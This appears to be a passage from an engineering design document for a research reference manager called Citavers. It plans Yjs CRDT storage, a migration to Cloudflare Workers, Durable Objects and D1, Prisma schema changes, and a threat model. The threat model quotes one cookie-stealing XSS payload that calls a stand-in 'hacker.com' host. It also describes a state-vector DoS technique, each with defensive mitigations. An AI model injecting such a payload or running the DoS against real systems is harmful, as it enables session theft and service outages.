The BYTEA Implementation (Avoiding JSONB): Do not store CRDT documents as JSONB. Updating deeply nested JSONB objects causes massive write-amplification in Postgres. Yjs updates compile to highly efficient binary data (Uint8Array). In Neon.db, you must use the BYTEA column type.
Backend Cron Jobs (The Garbage Collector): You need an Express.js cron job (e.g., using node-cron) running nightly at 03:00 AM to perform the Snapshotting and 30-Day Tombstone Pruning mentioned in Section 14.
Neon.db Cost Impact (The Cold Start Factor): Neon is a Serverless database. If no one uses Citavers at 3 AM, Neon scales its compute to zero (saving you money). When your cron job fires, it forces Neon to wake up (Cold Start). To minimize compute billing, the cron job should pull all CRDT documents into Node.js memory in batches (e.g., 100 at a time), squash them, and bulk-write them back to Neon, rather than keeping the database transaction open for an hour.
16. The Edge Computing Pivot (Cloudflare Workers + D1 Migration)
The limitations outlined in Section 15—specifically the Railway WebSocket RAM costs and the Neon.db 100-hour compute limit—present significant scaling risks. To completely eliminate these "Always-On" costs and optimize for a global collaborative architecture, migrating the entire backend to Cloudflare Workers and Cloudflare D1 (Serverless SQLite) is a strategically superior move.
A. The Architectural Shift (From Express to Isolates)
Moving from Node.js (Express) on Railway to Cloudflare Workers requires a fundamental shift in how the backend executes code.
The Isolate Model: Workers do not run a full Node.js environment. They run on V8 Isolates. This means lightning-fast cold starts (0ms) globally, but it also means many native Node.js modules (e.g., fs, raw TCP sockets) are unavailable.
Yjs Compatibility: Fortunately, Yjs is environment-agnostic. It runs perfectly inside a Cloudflare Worker because it relies purely on standard JavaScript arrays and maps. We do not need an Express wrapper; the Worker itself handles the HTTP and WebSocket upgrades natively.
B. Solving the WebSocket Cost Dilemma (Durable Objects)
In a traditional Express/Railway setup, handling WebSockets requires the server to stay awake 24/7, burning through the budget. Cloudflare solves this elegantly via Durable Objects.
How it Works: A Durable Object is a specialized Cloudflare Worker that guarantees strong consistency and maintains state (memory) across requests.
The Implementation: We create a Durable Object for each specific Citavers Workspace (or Group). When User A and User B open the same lab workspace, Cloudflare routes their WebSockets to the exact same Durable Object instance. The Y.Doc lives in the memory of this specific object.
The Cost Advantage: The Durable Object only runs (and bills you) when an active WebSocket message is passing through it. When the last user closes their browser, the Durable Object immediately spins down. There are no "idle server" costs, completely eliminating the Railway CPU bloat problem.
C. The Database Pivot: From Neon.db to Cloudflare D1
Neon.db is a powerful serverless Postgres, but its 100-hour compute limit is incompatible with always-on WebSockets. Cloudflare D1 (built on SQLite) operates on a completely different pricing model.
The D1 Advantage: D1 does not bill for "compute hours" or "idle time." It bills purely on storage and read/write operations. Since our yjs_snapshot and yjs_updates are simple binary blobs (BLOB in SQLite), D1 handles this effortlessly.
The Edge Location Benefit: With D1, the database operations execute at the Cloudflare Edge, geographically closest to the Durable Object. This significantly reduces the latency of saving the CRDT snapshot compared to querying a central Neon.db instance in AWS US-East.
Prisma Compatibility (The Edge Case): Prisma supports Cloudflare D1 (via the @prisma/adapter-d1 preview). However, Prisma's engine footprint can be heavy for edge environments. We must rigorously test if Prisma inflates the Worker bundle size beyond Cloudflare's 1MB/10MB limits, potentially requiring a pivot to a lighter query builder like Drizzle ORM for the Edge.
D. Re-evaluating Garbage Collection on the Edge
The Express cron job (Section 15-C) must be refactored for the Cloudflare ecosystem.
Cloudflare Cron Triggers: We replace node-cron with Cloudflare's native Cron Triggers.
The Distributed GC: Instead of one massive script pulling all documents from Neon.db, the Cron Trigger can simply wake up all sleeping Durable Objects once a day. Each Durable Object independently loads its specific BLOB from D1, performs Y.encodeStateAsUpdate() in its own isolated memory, prunes its own Tombstones, saves the flattened state back to D1, and goes back to sleep. This distributes the CPU load globally and prevents database bottlenecks.
17. Database Migration Plan (Prisma to CRDT)
Based on the provided Prisma schema, Citavers currently utilizes a classic LWW architecture (evidenced by version, deletedAt, clientId fields in Paper, and a dedicated SyncLog table).
Migrating to a CRDT (BYTEA or BLOB) architecture cannot happen overnight; it requires a phased transition to prevent data loss.
A. Phase 1: Schema Extension (Dual-State Preparation)
We do not delete the old tables yet. We introduce the new CRDT models to the Prisma schema alongside the existing ones.
// Proposed Prisma Additions for CRDT

// The central CRDT Document storing the binary graph
model CrdtDocument {
  id          String   @id // Deterministic ID (e.g., hash(DOI) or Composite ID)
  workspaceId String   @map("workspace_id") // ID of the User or Group
  
  // Yjs binary data (Use Bytes for Postgres/Neon, or switch to BLOB equivalent if migrating to D1)
  snapshot    Bytes?   // The flattened state
  updates     Bytes?   // Appended delta logs since last snapshot
  
  createdAt   DateTime @default(now()) @map("created_at")
  updatedAt   DateTime @updatedAt @map("updated_at")

  @@index([workspaceId])
  @@map("crdt_documents")
}

// To track which clients have synced up to which point (Vector Clocks)
model ClientSyncState {
  id          String   @id @default(cuid())
  userId      Int      @map("user_id")
  documentId  String   @map("document_id")
  stateVector Bytes    // The client's last known state vector
  lastSynced  DateTime @default(now()) @map("last_synced")

  @@unique([userId, documentId])
  @@map("client_sync_states")
}


B. Phase 2: The Data Extraction & Conversion (Background Script)
The collaborative fields in your Paper model (tags, notes, summary, status) and the Annotation model are the primary candidates for CRDT migration. Core metadata (title, authors, doi) can remain in standard relational columns (for easy querying), while collaborative fields move to the binary blob.
The Script: Write a one-off script that iterates through every Paper in the database.
The Conversion: For each paper, initialize a headless Yjs document (const ydoc = new Y.Doc()).
Injection: Extract the tags array and notes string from the relational Paper row, and inject them into the Yjs document (ydoc.getArray('tags').insert(0, paper.tags)).
Saving: Run Y.encodeStateAsUpdate(ydoc) and save the resulting binary blob into the new CrdtDocument table, linking it via the Deterministic ID.
C. Phase 3: Client-Side Cutover (Vanilla JS Update)
Frontend Update: Push an update to the Vanilla JS client. The new client stops reading tags and notes from the standard REST API JSON response.
WebSocket Activation: Instead, the client opens a WebSocket connection, requests the CrdtDocument binary blob for that paper, loads it into the local y-indexeddb, and binds the UI to the Yjs object.
Deprecation: Once telemetry confirms 95%+ of clients are successfully using the WebSocket/CRDT pipeline, you can safely drop the old version, clientId, and SyncLog dependencies, officially retiring the LWW architecture.
18. Security Vulnerabilities & Threat Mitigation (The Zero-Trust Model)
Transitioning from a traditional REST API to a Local-First CRDT architecture over WebSockets fundamentally changes the threat landscape. The system can no longer blindly trust the data structure or the persistent connections.
A. Local-First Exposure (The Physical Access Risk)
The Vulnerability: Citavers' "Zero-Login" Local-First capability is a massive UX advantage, but it inherently means data is stored unencrypted in the browser's IndexedDB.
The Threat: If a researcher leaves their laptop unlocked at a library, or if they install a malicious Chrome Extension that requests <all_urls> and storage permissions, an attacker can silently dump the entire Citavers library database directly from the browser without needing a password.
The Mitigation: We cannot encrypt IndexedDB easily without ruining the offline search experience. Instead, we must practice Security via Transparency.
Unauthenticated users must be shown a subtle but clear UI warning: "Data is stored locally in this browser. Do not use on public computers." * For authenticated users, the application should offer a "Clear Local Cache on Logout" feature for shared environments.
B. WebSocket Authorization Decay (The "Stale Socket" Edge Case)
The Vulnerability: In a standard REST API (like the old Citavers setup), every single HTTP request contains a JWT or Session token. If User A is kicked out of a shared lab Group, their very next API request is denied (403 Forbidden). WebSockets behave differently. Authentication usually only happens once, during the initial handshake.
The Threat: If User A establishes a WebSocket connection to the group's CrdtDocument, and the PI kicks User A out of the group 5 minutes later, User A's WebSocket might remain open. Because CRDTs continuously broadcast deltas, User A will continue to receive live, real-time updates of the group's confidential notes until their socket naturally drops.
The Mitigation (Active Severing): The backend (whether Express or Cloudflare Durable Object) must implement an active socket registry. When a permission change event occurs in the database (e.g., REMOVE user_id FROM workspace), the server must immediately look up User A's active connection state and force a server-side termination. Warning: Relying solely on token expiration times is insufficient for WebSockets.
C. CRDT Injection & XSS (The Malicious Payload Threat)
The Vulnerability: CRDTs are mathematically robust, but they are "content agnostic". The Yjs engine does not know or care if the string being synced is "Great paper!" or <script>fetch('hacker.com/steal?cookie='+document.cookie)</script>.
The Threat: A malicious user (or a compromised account within a shared group) could bypass the standard Citavers Vanilla JS UI, connect directly to the WebSocket via terminal, and inject a massive Cross-Site Scripting (XSS) payload into the "Contextual Discussion Drawer." Because Yjs blindly syncs this to all other group members, the moment they open the Drawer, the malicious script executes in their browser.
The Mitigation (Strict Sanitization): We cannot sanitize data inside the CRDT binary blob on the server (parsing binary Yjs on the server for every keystroke would destroy performance). Therefore, the defense must be 100% Client-Side on Read.
Before injecting any CRDT text into the Vanilla JS DOM (e.g., using element.innerHTML), it must be passed through an aggressive sanitization library like DOMPurify.
Absolute Rule: Never trust the data coming out of the Yjs document, even if it originated from an authenticated group member.
D. DoS via State Vector Manipulation (The Thundering Sync Attack)
The Vulnerability: As discussed in Section 13-D, when a client connects, they send a State Vector (a tiny map of what they already know). The server then calculates the missing data and sends it back.
The Threat: A malicious actor could repeatedly connect to the WebSocket and deliberately send an empty State Vector (Uint8Array([])). This tricks the server into thinking the client is brand new. The server will then continuously execute heavy CPU cycles to query the database and construct the massive "Full State Snapshot" payload, sending megabytes of data repeatedly. This will instantly drain compute quotas and cause a Denial of Service (DoS) for legitimate users.
The Mitigation (WebSocket Rate Limiting): While REST endpoints often have rate limiters, WebSockets are frequently overlooked.
We must implement a strict RateLimiter on the message event handler of the WebSocket. If a single client requests a "Full Sync" or sends a State Vector more than 3 times in a minute, the server should drop the connection and temporarily ban the IP. Cloudflare handles this exceptionally well natively via Cloudflare WAF/Rate Limiting rules.
19. Final Assessment & Next Steps for Engineering
Zotero Groups function exceptionally well as a "Shared Asynchronous Archive" but struggle as a "Real-Time Collaborative Workspace." Our platform, Citavers, possesses a massive onboarding advantage via our "zero-login IndexedDB" structure and a clean, metadata-rich UI.
Our Strategic Engineering Roadmap:
Execute the Cloudflare Pivot: Abandon the Express.js/Neon.db architecture to escape the "Always-On" WebSocket costs and 100-hour compute limits. Migrate the backend to Cloudflare Workers using Durable Objects for zero-idle-cost WebSocket handling, and Cloudflare D1 for scalable Edge SQLite storage.
Adopt Yjs for Synchronization (The CRDT Core): Implement the Yjs open-source framework via our Vanilla JS frontend.
Utilize y-websocket integrated with Cloudflare Durable Objects.
Implement aggressive auto-reconnect (Exponential Backoff) logic.
Exclude cursor tracking/awareness modules to maintain a lean architecture.
Master the First-Time Authentication Merge: * Implement deterministic, DOI-based hashing for Core Paper IDs to prevent CRDT duplication.
Implement Composite IDs for tags/notes to isolate personal context from shared groups.
Develop the Metadata-Level Discussion Drawer: Build a robust, real-time threaded chat system (powered by Yjs text types) that slides out from the right margin of the dashboard. Use "Snapshot Promotion" rather than "Sym-links" when users explicitly share personal notes to prevent unintended privacy leaks.
Execute the Database Migration (Prisma to D1): Add the CrdtDocument (BLOB) model, migrate collaborative fields (notes, tags) into binary blobs via background scripts, and transition the frontend to read from WebSockets. Validate Prisma's compatibility with Cloudflare Workers' bundle size limits before committing.
Deploy Edge Garbage Collection: Utilize Cloudflare Cron Triggers to wake up Durable Objects nightly, forcing them to perform State Snapshotting and strict 30-Day Tombstone Pruning in isolation, distributing the CPU load globally.
Secure the Architecture (Zero-Trust Enforcement): * Implement explicit WebSocket severing upon group permission changes to prevent "Stale Socket" data leaks.
Enforce aggressive DOMPurify XSS sanitization on the Vanilla JS frontend before rendering any CRDT text.
Apply Cloudflare Rate Limiting on WebSocket State Vector requests to prevent Edge DoS attacks.

